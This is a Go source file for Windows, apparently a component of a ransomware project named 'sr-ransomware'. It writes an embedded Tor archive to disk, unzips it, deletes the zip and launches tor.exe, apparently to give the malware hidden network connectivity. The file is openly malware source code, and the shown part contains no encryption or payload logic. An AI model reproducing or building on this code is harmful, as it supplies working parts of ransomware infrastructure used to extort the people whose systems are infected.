// +build windows

package exe

import (
    "os"
    "os/exec"

    "github.com/sug0/sr-ransomware/go/fs"
    "github.com/sug0/sr-ransomware/go/errors"
)

func (t *Tor) Start() error {
    if t.cmd != nil {
        return ErrAlreadyRunning
    }
    torExePath := t.path + `\tor.exe`
    if _, err := os.Stat(torExePath); err != nil {
        err = t.extract()
        if err != nil {
            return err
        }
        err = os.Remove(t.path + `\tor.zip`)
        if err != nil {
            return errors.Wrap(pkg, "failed to delete tor zip", err)
        }
    }
    if t.config != "" {
        t.cmd = exec.Command(torExePath, "-f", t.config)
    } else {
        t.cmd = exec.Command(torExePath)
    }
    return t.bootstrap()
}

func (t *Tor) extract() error {
    err := os.Mkdir(t.path, os.ModePerm)
    if err != nil && !os.IsExist(err) {
        return errors.Wrap(pkg, "failed to create tor dir", err)
    }
    torZipPath := t.path + `\tor.zip`
    f, err := os.Create(torZipPath)
    if err != nil {
        return errors.Wrap(pkg, "failed to create tor zip", err)
    }
    defer f.Close()
    _, err = f.Write(torZIP)
    if err != nil {
        return errors.Wrap(pkg, "failed to write tor zip", err)
    }
    err = fs.Unzip(t.path, torZipPath)
    if err != nil {
        return errors.Wrap(pkg, "failed to unzip tor", err)
    }
    return nil
}
